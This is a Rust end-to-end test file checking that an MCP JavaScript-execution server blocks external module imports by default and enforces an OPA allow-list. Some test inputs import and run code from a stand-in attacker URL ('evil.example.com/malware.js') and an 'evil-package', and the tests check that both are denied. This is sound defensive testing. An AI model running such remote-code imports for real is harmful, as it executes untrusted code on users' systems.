/// End-to-end tests for module import policy enforcement.
///
/// These tests start a real OPA server with policies from the `policies/` directory
/// and an mcp-js server via stdio, then verify that:
/// - External modules are blocked by default (no --allow-external-modules flag)
/// - When --allow-external-modules is set with --opa-module-policy, OPA audits imports
/// - Allowed packages (per the OPA policy) succeed; denied packages fail
///
/// Requirements: `opa` binary must be on PATH.
/// Run with: cargo test --test module_policy_e2e

use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::process::{Child, Command};
use tokio::time::{timeout, Duration};
use serde_json::{json, Value};
use std::process::Stdio;

mod common;

// ── OPA server helper ────────────────────────────────────────────────────

struct OpaServer {
    child: Child,
    url: String,
}

impl OpaServer {
    /// Start an OPA server on a random port with the project's policies directory.
    async fn start() -> Result<Self, Box<dyn std::error::Error>> {
        // Find the policies directory relative to the server crate root
        let policies_dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
            .parent()
            .unwrap()
            .join("policies");
        assert!(
            policies_dir.exists(),
            "policies directory not found at {:?}",
            policies_dir
        );

        // Find a free port
        let listener = std::net::TcpListener::bind("127.0.0.1:0")?;
        let port = listener.local_addr()?.port();
        drop(listener);

        let addr = format!("127.0.0.1:{}", port);
        let child = Command::new("opa")
            .args(&[
                "run",
                "--server",
                "--addr",
                &addr,
                policies_dir.to_str().unwrap(),
            ])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn()?;

        let url = format!("http://{}", addr);

        // Wait for OPA to be ready
        let client = reqwest::Client::new();
        for _ in 0..50 {
            tokio::time::sleep(Duration::from_millis(100)).await;
            if client
                .get(format!("{}/health", url))
                .timeout(Duration::from_millis(200))
                .send()
                .await
                .is_ok()
            {
                return Ok(OpaServer { child, url });
            }
        }
        Err("OPA server did not start within 5 seconds".into())
    }

    async fn stop(mut self) {
        let _ = self.child.kill().await;
    }
}

// ── MCP stdio server helper ─────────────────────────────────────────────

struct McpStdioServer {
    child: Child,
    stdin: tokio::process::ChildStdin,
    stdout: BufReader<tokio::process::ChildStdout>,
}

impl McpStdioServer {
    /// Start the MCP server via stdio with given extra CLI args.
    async fn start(
        heap_dir: &str,
        extra_args: &[&str],
    ) -> Result<Self, Box<dyn std::error::Error>> {
        let mut args = vec!["--directory-path", heap_dir];
        args.extend_from_slice(extra_args);

        let mut child = Command::new(env!("CARGO_BIN_EXE_server"))
            .args(&args)
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::null())
            .spawn()?;

        let stdin = child.stdin.take().expect("Failed to get stdin");
        let stdout = child.stdout.take().expect("Failed to get stdout");
        let stdout = BufReader::new(stdout);

        tokio::time::sleep(Duration::from_millis(500)).await;

        Ok(McpStdioServer {
            child,
            stdin,
            stdout,
        })
    }

    async fn send_message(&mut self, message: Value) -> Result<Value, Box<dyn std::error::Error>> {
        let message_str = serde_json::to_string(&message)?;
        let message_with_newline = format!("{}\n", message_str);
        self.stdin
            .write_all(message_with_newline.as_bytes())
            .await?;
        self.stdin.flush().await?;

        let mut response_line = String::new();
        timeout(Duration::from_secs(10), self.stdout.read_line(&mut response_line)).await??;
        let response: Value = serde_json::from_str(&response_line)?;
        Ok(response)
    }

    async fn send_notification(
        &mut self,
        notification: Value,
    ) -> Result<(), Box<dyn std::error::Error>> {
        let s = serde_json::to_string(&notification)?;
        self.stdin
            .write_all(format!("{}\n", s).as_bytes())
            .await?;
        self.stdin.flush().await?;
        Ok(())
    }

    /// Initialize the MCP handshake.
    async fn initialize(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        let init_msg = json!({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "initialize",
            "params": {
                "protocolVersion": "2024-11-05",
                "capabilities": {},
                "clientInfo": { "name": "module-policy-e2e", "version": "1.0.0" }
            }
        });
        self.send_message(init_msg).await?;
        self.send_notification(json!({
            "jsonrpc": "2.0",
            "method": "notifications/initialized"
        }))
        .await?;
        Ok(())
    }

    /// Run JS code and wait for completion. Returns the execution info JSON.
    async fn run_js_and_wait(
        &mut self,
        id: u64,
        code: &str,
    ) -> Result<Value, Box<dyn std::error::Error>> {
        let msg = json!({
            "jsonrpc": "2.0",
            "id": id,
            "method": "tools/call",
            "params": {
                "name": "run_js",
                "arguments": { "code": code }
            }
        });

        let response = self.send_message(msg).await?;
        let exec_id = common::extract_execution_id(&response)
            .ok_or("run_js response should contain execution_id")?;

        for i in 0..120 {
            tokio::time::sleep(Duration::from_millis(100)).await;
            let poll_msg = json!({
                "jsonrpc": "2.0",
                "id": 10000 + id * 1000 + i,
                "method": "tools/call",
                "params": {
                    "name": "get_execution",
                    "arguments": { "execution_id": exec_id }
                }
            });

            let poll_resp = self.send_message(poll_msg).await?;
            if let Some(info) = common::extract_execution_info(&poll_resp) {
                match info["status"].as_str() {
                    Some("completed") | Some("failed") | Some("timed_out") | Some("cancelled") => {
                        return Ok(info);
                    }
                    _ => continue,
                }
            }
        }
        Err("Execution did not complete within polling timeout".into())
    }

    async fn stop(mut self) {
        let _ = self.child.kill().await;
    }
}

// ══════════════════════════════════════════════════════════════════════════
// E2E: External modules blocked by default
// ══════════════════════════════════════════════════════════════════════════

#[tokio::test]
async fn test_e2e_external_modules_blocked_by_default() -> Result<(), Box<dyn std::error::Error>> {
    let heap_dir = common::create_temp_heap_dir();
    // Start server WITHOUT --allow-external-modules (default = disabled)
    let mut server = McpStdioServer::start(&heap_dir, &[]).await?;
    server.initialize().await?;

    // Try to import an npm package — should fail
    let info = server
        .run_js_and_wait(
            2,
            r#"import { camelCase } from "npm:lodash-es@4.17.21";
camelCase("hello_world");"#,
        )
        .await?;

    assert_eq!(info["status"].as_str(), Some("failed"), "Should fail: {:?}", info);
    let error = info["error"].as_str().unwrap_or("");
    assert!(
        error.contains("External module imports are disabled"),
        "Error should mention disabled imports, got: {}",
        error
    );

    // Plain JS should still work
    let info2 = server.run_js_and_wait(3, "1 + 2;").await?;
    assert_eq!(info2["status"].as_str(), Some("completed"));
    assert_eq!(info2["result"].as_str(), Some("3"));

    server.stop().await;
    common::cleanup_heap_dir(&heap_dir);
    Ok(())
}

#[tokio::test]
async fn test_e2e_external_modules_blocked_jsr() -> Result<(), Box<dyn std::error::Error>> {
    let heap_dir = common::create_temp_heap_dir();
    let mut server = McpStdioServer::start(&heap_dir, &[]).await?;
    server.initialize().await?;

    let info = server
        .run_js_and_wait(
            2,
            r#"import { camelCase } from "jsr:@luca/cases@1.0.0";
camelCase("hello_world");"#,
        )
        .await?;

    assert_eq!(info["status"].as_str(), Some("failed"));
    let error = info["error"].as_str().unwrap_or("");
    assert!(
        error.contains("External module imports are disabled"),
        "got: {}",
        error
    );

    server.stop().await;
    common::cleanup_heap_dir(&heap_dir);
    Ok(())
}

#[tokio::test]
async fn test_e2e_external_modules_blocked_url() -> Result<(), Box<dyn std::error::Error>> {
    let heap_dir = common::create_temp_heap_dir();
    let mut server = McpStdioServer::start(&heap_dir, &[]).await?;
    server.initialize().await?;

    let info = server
        .run_js_and_wait(
            2,
            r#"import { camelCase } from "https://esm.sh/lodash-es@4.17.21";
camelCase("hello_world");"#,
        )
        .await?;

    assert_eq!(info["status"].as_str(), Some("failed"));
    let error = info["error"].as_str().unwrap_or("");
    assert!(
        error.contains("External module imports are disabled"),
        "got: {}",
        error
    );

    server.stop().await;
    common::cleanup_heap_dir(&heap_dir);
    Ok(())
}

// ══════════════════════════════════════════════════════════════════════════
// E2E: OPA module policy enforcement (requires opa binary)
// ══════════════════════════════════════════════════════════════════════════

#[tokio::test]
#[ignore] // Requires: opa binary on PATH + network access to esm.sh
async fn test_e2e_opa_allows_whitelisted_npm_package() -> Result<(), Box<dyn std::error::Error>> {
    let opa = OpaServer::start().await?;
    let heap_dir = common::create_temp_heap_dir();

    let mut server = McpStdioServer::start(
        &heap_dir,
        &[
            "--opa-url",
            &opa.url,
            "--allow-external-modules",
            "--opa-module-policy",
            "mcp/modules",
        ],
    )
    .await?;
    server.initialize().await?;

    // lodash-es is in the allowed_npm_packages set in modules.rego
    let info = server
        .run_js_and_wait(
            2,
            r#"import camelCase from "npm:lodash-es@4.17.21/camelCase";
console.log(camelCase("hello_world"));"#,
        )
        .await?;

    // The import should pass OPA policy checks (not "denied by policy").
    // It may still fail due to network issues (can't reach esm.sh), but
    // that's a fetch error, not a policy denial.
    match info["status"].as_str() {
        Some("completed") => {} // ideal: full network access
        Some("failed") => {
            let error = info["error"].as_str().unwrap_or("");
            assert!(
                !error.contains("denied by policy"),
                "Whitelisted npm package should NOT be denied by policy, got: {}",
                error
            );
            // Network fetch failure is acceptable in restricted environments
            assert!(
                error.contains("Failed to fetch module") || error.contains("error sending request"),
                "Expected a network fetch error (not policy), got: {}",
                error
            );
        }
        other => panic!("Unexpected status {:?}: {:?}", other, info),
    }

    server.stop().await;
    opa.stop().await;
    common::cleanup_heap_dir(&heap_dir);
    Ok(())
}

#[tokio::test]
#[ignore] // Requires: opa binary on PATH
async fn test_e2e_opa_denies_non_whitelisted_npm_package() -> Result<(), Box<dyn std::error::Error>>
{
    let opa = OpaServer::start().await?;
    let heap_dir = common::create_temp_heap_dir();

    let mut server = McpStdioServer::start(
        &heap_dir,
        &[
            "--opa-url",
            &opa.url,
            "--allow-external-modules",
            "--opa-module-policy",
            "mcp/modules",
        ],
    )
    .await?;
    server.initialize().await?;

    // "evil-package" is NOT in the allowed_npm_packages set
    let info = server
        .run_js_and_wait(
            2,
            r#"import evil from "npm:evil-package@1.0.0";
evil();"#,
        )
        .await?;

    assert_eq!(
        info["status"].as_str(),
        Some("failed"),
        "Non-whitelisted npm package should be denied: {:?}",
        info
    );
    let error = info["error"].as_str().unwrap_or("");
    assert!(
        error.contains("denied by policy"),
        "Error should mention policy denial, got: {}",
        error
    );

    server.stop().await;
    opa.stop().await;
    common::cleanup_heap_dir(&heap_dir);
    Ok(())
}

#[tokio::test]
#[ignore] // Requires: opa binary on PATH
async fn test_e2e_opa_denies_non_whitelisted_url_host() -> Result<(), Box<dyn std::error::Error>> {
    let opa = OpaServer::start().await?;
    let heap_dir = common::create_temp_heap_dir();

    let mut server = McpStdioServer::start(
        &heap_dir,
        &[
            "--opa-url",
            &opa.url,
            "--allow-external-modules",
            "--opa-module-policy",
            "mcp/modules",
        ],
    )
    .await?;
    server.initialize().await?;

    // "evil.example.com" is NOT in allowed_url_hosts
    let info = server
        .run_js_and_wait(
            2,
            r#"import foo from "https://evil.example.com/malware.js";
foo();"#,
        )
        .await?;

    assert_eq!(
        info["status"].as_str(),
        Some("failed"),
        "Non-whitelisted URL host should be denied: {:?}",
        info
    );
    let error = info["error"].as_str().unwrap_or("");
    assert!(
        error.contains("denied by policy"),
        "Error should mention policy denial, got: {}",
        error
    );

    server.stop().await;
    opa.stop().await;
    common::cleanup_heap_dir(&heap_dir);
    Ok(())
}

#[tokio::test]
#[ignore] // Requires: opa binary on PATH
async fn test_e2e_opa_plain_js_unaffected() -> Result<(), Box<dyn std::error::Error>> {
    let opa = OpaServer::start().await?;
    let heap_dir = common::create_temp_heap_dir();

    let mut server = McpStdioServer::start(
        &heap_dir,
        &[
            "--opa-url",
            &opa.url,
            "--allow-external-modules",
            "--opa-module-policy",
            "mcp/modules",
        ],
    )
    .await?;
    server.initialize().await?;

    // Plain JS (no imports) should work fine
    let info = server.run_js_and_wait(2, "1 + 2;").await?;
    assert_eq!(info["status"].as_str(), Some("completed"));
    assert_eq!(info["result"].as_str(), Some("3"));

    server.stop().await;
    opa.stop().await;
    common::cleanup_heap_dir(&heap_dir);
    Ok(())
}

#[tokio::test]
#[ignore] // Requires: opa binary on PATH
async fn test_e2e_allow_external_without_opa_policy() -> Result<(), Box<dyn std::error::Error>> {
    // With --allow-external-modules but NO --opa-module-policy, all external modules
    // should be allowed (no OPA audit). The import may still fail if no network, but
    // the error should not be a policy denial.
    let heap_dir = common::create_temp_heap_dir();

    let mut server = McpStdioServer::start(
        &heap_dir,
        &["--allow-external-modules"],
    )
    .await?;
    server.initialize().await?;

    let info = server
        .run_js_and_wait(
            2,
            r#"import foo from "npm:some-random-pkg@0.0.1";
foo;"#,
        )
        .await?;

    // May fail due to network, but should NOT be a policy denial
    if info["status"].as_str() == Some("failed") {
        let error = info["error"].as_str().unwrap_or("");
        assert!(
            !error.contains("denied by policy"),
            "Without OPA policy, should not get policy denial, got: {}",
            error
        );
    }

    server.stop().await;
    common::cleanup_heap_dir(&heap_dir);
    Ok(())
}
